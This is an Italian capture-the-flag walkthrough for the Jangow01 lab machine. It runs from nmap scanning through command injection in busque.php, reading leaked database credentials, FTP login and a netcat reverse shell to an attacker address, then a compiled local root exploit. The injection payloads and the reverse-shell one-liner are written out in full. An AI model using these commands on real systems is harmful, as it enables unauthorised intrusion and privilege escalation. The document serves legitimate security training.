
# README - Guida alla CTF: Macchina Jangow01

Questa guida spiega passo per passo come completare la CTF sulla macchina Jangow01, partendo dall'accesso iniziale fino all'escalation dei privilegi e al recupero della flag finale.

---

## **Passaggi**

### **1. Ricognizione Iniziale**

1. **Pingare la macchina target** per verificare che sia attiva:
   ```bash
   ping 192.168.56.118
   ```
   ![Ping della macchina](./ping1.png)

2. **Scansionare le porte con Nmap** per identificare i servizi attivi:
   ```bash
   sudo nmap -sC -sV -O -p- 192.168.56.118
   ```
   ![Risultato Nmap](./nmap_results.png)
   - Porte trovate aperte:
     - **21/tcp**: FTP (vsftpd 3.0.3)
     - **80/tcp**: HTTP (Apache 2.4.18)

### **2. Enumerazione dei Servizi**

#### HTTP
1. Aprire il browser e visitare `http://192.168.56.118/site`.
   ![Homepage HTTP](./homepage_http.png)

2. Cercare file o directory interessanti. Notare `busque.php` e utilizzare il parametro `buscar` per eseguire comandi:
   ```bash
   http://192.168.56.118/site/busque.php?buscar=ls
   ```
   ![Command Injection](./command_injection_ls.png)

3. Esplorare il filesystem tramite comandi come `pwd` e `ls`. Identificare file sensibili come `.backup`:
   ```bash
   http://192.168.56.118/site/busque.php?buscar=cat /var/www/html/.backup
   ```
   Output:
   ```php
   $servername = "localhost";
   $database = "jangow01";
   $username = "jangow01";
   $password = "abygurL09";
   ```
   ![Contenuto del file backup](./backup_file_content.png)

### **3. Accesso Iniziale**

#### FTP
1. Collegarsi al server FTP utilizzando le credenziali trovate:
   ```bash
   ftp 192.168.56.118
   Name: jangow01
   Password: abygurL09
   ```
   ![Connessione FTP](./ftp_connection.png)

2. Esplorare il server FTP per cercare file utili.

#### Reverse Shell
1. Preparare Netcat per ricevere una connessione:
   ```bash
   nc -lvnp 443
   ```
   ![Preparazione Netcat](./netcat_ready.png)

2. Utilizzare il parametro `buscar` per caricare una reverse shell:
   ```bash
   http://192.168.56.118/site/busque.php?buscar=mkfifo /tmp/s; nc 192.168.56.103 443 0</tmp/s | /bin/bash >/tmp/s 2>&1; rm /tmp/s
   ```
   ![Reverse Shell HTTP](./reverse_shell_command.png)

3. Una volta stabilita la connessione, si otterrà accesso come utente `www-data`.
   ![Shell www-data](./www_data_shell.png)

### **4. Escalation dei Privilegi**

1. **Stabilizzare la shell**:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   export TERM=xterm
   ```
   ![Shell stabilizzata](./stable_shell.png)

2. **Cambiare utente**:
   Utilizzare la password trovata per accedere come `jangow01`:
   ```bash
   su jangow01
   Password: abygurL09
   ```
   ![Cambio utente](./user_switch.png)

3. **Escalare i privilegi a root**:
   - Nella directory `/home/jangow01`, trovare ed eseguire il file `gatto.c`:
     ```bash
     gcc gatto.c -o shell2
     ./shell2
     ```
     ![Compilazione ed esecuzione](./compile_execute.png)
   - Verificare di essere root:
     ```bash
     whoami
     root
     ```
     ![Accesso root](./root_access.png)

### **5. Recuperare la Flag Finale**
1. Accedere alla directory `/root`:
   ```bash
   cd /root
   ```
   ![Accesso directory root](./access_root_directory.png)

2. Leggere il contenuto di `proof.txt`:
   ```bash
   cat proof.txt
   ```
   Output:
   ```
   da39a3ee5e6b4b0d3255bfef95601890afd80709
   ```
   ![Flag Finale](./final_flag.png)

---

## **Note Importanti**

- Assicurarsi di proteggere file sensibili come `.backup`.
- Aggiornare i servizi e il kernel della macchina per evitare exploit noti.
- Sanitizzare tutti i parametri di input per prevenire vulnerabilità di injection.

Seguendo questa guida passo per passo, è possibile replicare l'intera procedura per completare la CTF sulla macchina Jangow01. Buona fortuna! 🚀

